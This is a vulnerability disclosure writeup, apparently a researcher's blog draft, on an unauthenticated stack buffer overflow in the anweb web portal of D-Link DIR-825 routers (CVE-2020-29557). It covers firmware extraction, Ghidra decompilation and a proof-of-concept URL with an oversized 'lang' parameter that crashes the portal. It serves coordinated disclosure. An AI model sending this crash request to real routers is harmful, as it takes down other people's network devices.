+++
title = 'CVE-2020-29557 Writeup'
date = 2024-07-27
draft = true
description = 'A simple stack-based buffer overflow in common web portal of DLink routers'
+++

To get started, we want to get access to the device's firmware. To do so, a simple google search will lead to DLink-Russia's website which opens a small database of firmwares of their devices ready for user to use to update the firmware of their own devices.

![alt text](/images/dir825/dir-fws.png "from their website")

Since my own router is the "simple" DIR-825 

```bash
 ~/De/programming2/dlink-retest  binwalk ./fw.bin                          ✔

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
14360         0x3818          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 7335952 bytes
2293760       0x230000        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 6653016 bytes, 2261 inodes, blocksize: 131072 bytes, created: 2019-09-16 10:05:39
```

The first thing I jumped to to check is the filesystem:
after `unsquatch`ing it we can browse the filesystem. At first, I was looking for the `www` folder or something similar but couldn't find it, so I performed a simple `find` to discover HTML files in the filesystem:

```
 ~/De/p/dlink-r/_/squashfs-root  find . -name "*.html"                     ✔
./usr/share/xupnpd/ui/ui_main.html
./usr/share/xupnpd/ui/ui_config.html
./usr/share/xupnpd/ui/ui_template.html
./usr/share/xupnpd/www/index.html
./usr/share/transmission/web/index.html
./srv/anweb/browser_check/build/eng/bad.html
./srv/anweb/browser_check/build/eng/old.html
./srv/anweb/browser_check/build/rus/bad.html
./srv/anweb/browser_check/build/rus/old.html
./srv/anweb/apps/trouble/index.html
./srv/anweb/apps/trouble/templates/body.tpl.html
```

After browsing and cross-referceing with the running router I have in my possesion, it does seem that these files are served as a part of the web portal of the router.

Now I want to look for the binary that handles it, I would expect something like `apache` to reside somewhere in the system but no such thing was found. So I've decided to look into this "anweb" thing, let's see what else can we find about this in the filesystem:

```
 ~/De/p/dlink-r/_/squashfs-root  find . -name "anweb"                      ✔
./usr/sbin/anweb
./srv/anweb
```
Besides the directory at `/srv/anweb` which we already know about, there's a binary `anweb`. 

```
 ~/De/p/dlink-r/_/squashfs-root  file ./usr/sbin/anweb                     ✔
./usr/sbin/anweb: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
```

So I took a look at the `anweb` binary in Ghidra.

Since this is an ELF file, Ghidra didn't have much trouble disassembling it. And thanks to the symbols reamined in the binary (it was not stripped), then reversing it was also pretty straight forward.

I started by looking at `main`:

We can easily spot the main when we look at the ELF's entry function:

![Untitled.png](/images/dir825/Untitled.png)

Checking inside the `_ftext` function we can clearly see some configurations taking place 

We can see the port it is listening on:

![Untitled%201.png](/images/dir825/Untitled%201.png)

as well as some important endpoints the service is exposing:

![Untitled%202.png](/images/dir825/Untitled%202.png)

So if we've had our doubts about the purpose of this binary, it is pretty clear at this point - this is the web portal. 

After looking at the various endpoints functions I came across the `check_browser_end_point` function:

```jsx
undefined4 check_browser_end_point(undefined4 param_1)

{
  bool bVar1;
  int iVar2;
  size_t sVar3;
  char *__s;
  char *pcVar4;
  char acStack824 [512];
  char acStack312 [128];
  char acStack184 [128];
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  
  iVar2 = mg_get_request_info();
  pcVar4 = *(char **)(iVar2 + 0xc);
  local_38 = 0x20676e65;
  local_34 = 0x20737572;
  local_30 = 0x726b75;
  __s = pcVar4;
  if (pcVar4 == NULL) {
    __s = "";
  }
  sVar3 = strlen(__s);
  mg_get_var(pcVar4,sVar3,"error",acStack184,0x200);
  bVar1 = true;
  iVar2 = strcmp("bad",acStack184);
  if (iVar2 != 0) {
    iVar2 = strcmp("old",acStack184);
    bVar1 = iVar2 == 0;
  }
  mg_get_var(pcVar4,sVar3,&DAT_00420b68,acStack312,0x200);
  sVar3 = strlen(acStack312);
  if ((sVar3 == 3) && (__s = strstr("eng rus ukr",acStack312), __s != NULL)) {
    if (bVar1) goto LAB_0040a33c;
    bVar1 = true;
LAB_0040a2ec:
    strncpy(acStack184,"bad",0x80);
    if (bVar1) goto LAB_0040a33c;
  }
  else {
    if (!bVar1) goto LAB_0040a2ec;
  }
  __s = strtok((char *)&local_38," ");
  strncpy(acStack312,__s,0x7f);
LAB_0040a33c:
  sprintf(acStack824,"%s/browser_check/build/%s/%s.html","/srv/anweb",acStack312,acStack184);
  mg_send_file(param_1,acStack824);
  return 1;
}
```

This function accepts 2 arguments from the GET parameters and place them on the stack after processing them.

To process them from the URI, the function is using `mg_get_var` which is a library function which is defined like this:

```jsx
mg_get_var( data, data_len, var_name, dst, dst_len );
```

[from the docs](https://github.com/civetweb/civetweb/blob/master/docs/api/mg_get_var.md)

And in our function we see 2 usages of this function:

```c
mg_get_var(pcVar4,sVar3,"error",acStack184,0x200);

```

and 

```c
mg_get_var(pcVar4,sVar3,&DAT_00420b68,acStack312,0x200);

```

which is basically

```c
mg_get_var(pcVar4,sVar3,"lang",acStack312,0x200);
```

And according to how Ghidra sees the stack, the length of these 2 buffers is only `128` which is way less than `0x200 == 512`.

A clear stack based buffer overflow is found in this function, and since this endpoint is accessible without authenticating to the web portal beforehand, any client on the network can send this request and it will be processed by the program.

What about mitigations? well, stack-cookies are not found when looking at the end of the function:

```c
0040a36c 09 f8 20 03     jalr       t9=>mg_send_file                                 undefined mg_send_file()
0040a370 21 20 a0 02     _move      a0,s5
0040a374 54 03 bf 8f     lw         ra,local_4(sp)
0040a378 50 03 b7 8f     lw         s7,local_8(sp)
0040a37c 4c 03 b6 8f     lw         s6,local_c(sp)
0040a380 48 03 b5 8f     lw         s5,local_10(sp)
0040a384 44 03 b4 8f     lw         s4,local_14(sp)
0040a388 40 03 b3 8f     lw         s3,local_18(sp)
0040a38c 3c 03 b2 8f     lw         s2,local_1c(sp)
0040a390 38 03 b1 8f     lw         s1,local_20(sp)
0040a394 34 03 b0 8f     lw         s0,local_24(sp)
0040a398 01 00 02 24     li         v0,0x1
0040a39c 08 00 e0 03     jr         ra
0040a3a0 58 03 bd 27     _addiu     sp,sp,0x358
```

As we can see, the function returns with `jr ra` right after it loads the s-registers back from the stack and restoring the stack pointer (in MIPS, before the `jr` instruction is executed, the instruction listed after the `jr` is executed, and then the `jr` is executed)

To confirm this issue, all we need is to send an HTTP request to the router using the `check_browser` end point and overflow the `lang` or the `error` GET parameters. 
Recall that this end point is handled for every request. That means - we do not need to authenticate to the router web portal to trigger this crash.

Simply using this URL crashes my router:
```
router/check_browser?lang=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

And indeed, the web portal has crashed and we can no longer access it unless we reboot.

All the D-Link DIR-825 variant router contain the same vulnerable `anweb` binary therefore the following devices were affected by this vulnerability:
- DIR-825
- DIR-825_ACF_F1
- DIR-825_AC_E
- DIR-825_AC_E1A
- DIR-825_A_D1A
- DIR-825_GF

FW version affected:
Up to 3.0.1 

### Timeline
- The issue has been reported to D-Link Russia on 9/11/2020
- The issue was fixed on 12/11/2020 and permission to publish was granted by D-Link

### CVE
- Currently pending [CVE:2020-29557](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-29557)





In the future, I'll show how this can be exploited to get a remote shell on this MIPS device. 